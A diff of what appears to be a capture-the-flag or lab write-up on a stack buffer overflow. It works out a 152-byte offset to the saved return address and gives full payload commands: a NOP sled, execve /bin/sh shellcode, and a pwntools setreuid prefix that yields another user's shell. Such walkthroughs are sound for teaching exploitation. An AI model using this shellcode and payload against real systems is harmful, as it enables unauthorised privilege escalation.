@@ -890,27 +890,6 @@ In this case the location of buffer is var_90h at 0x7fffffffe2c0 so thats our ta
 
 To varify var_90h is buffer and identify which offset is buffer:
 
-Note: 
-- var_90h uses x90 space thats about 16x9=144 (yes bigger than stated in code, rest is just unused space at end)
-- sub rsp, 0xa0 is the total of stack 160 bytes
-- Saved RIP is always at rbp + 8
-- Buffer starts at RBP - buffer_size = RBP - 144
-- Offset is buffer_size + 8
-In our binary:
-- buffer_size = 144
-- saved_RBP = 8
-- saved_RIP = 8
-- Offset to RIP = 144+8 =152
-
-The payload you need should be:
-Code
-NOP sled:      100 bytes
-Shellcode:      40 bytes
-Padding:        12 bytes
-Return address:  8 bytes
---------------------------------
-Total:         160 bytes
-  
 ```
 [0x00400527]> pdf @ sym.copy_arg
             ;-- rip:
@@ -937,6 +916,25 @@ Total:         160 bytes
 [0x00400527]> 
 ```
 
+Note: 
+- var_90h uses x90 space thats about 16x9=144 (yes bigger than stated in code, rest is just unused space at end)
+- sub rsp, 0xa0 is the total of stack 160 bytes
+- padding required to reach RIP not including address is 16 bytes
+- Saved RIP is always at rbp + 8
+- Buffer starts at RBP - buffer_size = RBP - 144
+- Offset to RIP determined by fuzzing with python and adding A's was 152
+
+The payload you need should be:
+152 for binary to RIP + 8 for the return address
+
+NOP sled:      100 bytes
+Shellcode:      40 bytes
+Padding:        12 bytes
+Return address:  8 bytes
+--------------------------------
+Total:         160 bytes
+
+
 ## Drop this into your payload and enter as argument to buffer-overflow script:
 ```
 overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
@@ -951,18 +949,20 @@ sh-4.2$
 - Shell word but the suid permissions not carried from user2.
 - user1 tested for sudo -l and should have gone through the list of apps to find a vulnerable one but from a view of walkthroughs looks like I reached a similar point others did. So I thought I would try the pwntools options they did. What other did was to generate a prefix to our shellcode to run SETREUID, this is appended so reduce the nop sled accordingly to accomodate the new bytes.
 
+```
 $ pwn shellcraft -f d amd64.linux.setreuid 1002
 \x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
-$ python
->>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
-14
-Our payload now looks like this:
+```
+That's 14 bytes extra for shell and 14 less for nop sled.
 
 NOP = 86
 setreuid = 14
 shellcode = 40
 padding = 12
-Total size = 160
+-----------------
+Total size = 152
+
+Total payload size 152 bytes  + return address (8 bytes, or 6+2 padding) = 160 bytes
 
 ```
 overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*86 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
